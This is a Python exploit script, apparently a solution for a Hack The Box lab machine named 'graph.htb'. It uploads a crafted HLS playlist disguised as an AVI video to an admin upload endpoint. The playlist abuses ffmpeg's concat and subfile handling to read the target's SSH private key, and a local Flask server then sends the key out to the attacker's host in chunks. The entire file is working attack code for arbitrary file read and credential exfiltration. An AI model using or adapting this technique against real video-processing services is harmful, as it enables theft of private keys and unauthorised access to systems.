#!/usr/bin/env python3

import os
import requests
import sys

from flask import Flask, request

app = Flask(__name__)
file = ['-----BEGIN OPENSSH PRIVATE KEY-----']
enable = 0


@app.route('/header.m3u8', methods=['GET'])
def header():
    global IP
    global enable

    if enable < 2:
        enable += 1
        return f'#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:,\nhttp://{IP}/?d='
    else:
        upload_video(len('\n'.join(file)) + 1)
        enable = 0

    return ''


@app.route('/', methods=['GET'])
def index():
    data = request.args.get('d').replace(' ', '+')
    file.append(data)
    write_file()

    return ''


def write_file():
    with open('id_rsa', 'w') as f:
        f.write('\n'.join(file) + '\n-----END OPENSSH PRIVATE KEY-----\n')


def upload_video(offset: int):
    global IP
    global admin_token

    if offset > 10000:
        os._exit(0)

    payload = f'''
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://{IP}/header.m3u8|subfile,,start,{offset},end,10000,,:/home/user/.ssh/id_rsa
#EXT-X-ENDLIST
'''[1:]

    requests.post('http://10.10.11.157/admin/video/upload', headers={
        'Host': 'internal-api.graph.htb',
        'admintoken': admin_token
    }, files=[
        ('file', ('video.avi', payload.encode(), 'video/x-msvideo'))
    ])


def main():
    global IP
    global admin_token

    if len(sys.argv) != 3:
        print(f'Usage: python3 {sys.argv[0]} <lhost> <adminToken>')
        exit(1)

    IP = sys.argv[1]
    admin_token = sys.argv[2]


if __name__ == '__main__':
    main()
    upload_video(len(file[0]) + 1)
    app.run(host='0.0.0.0', port=80, debug=True)
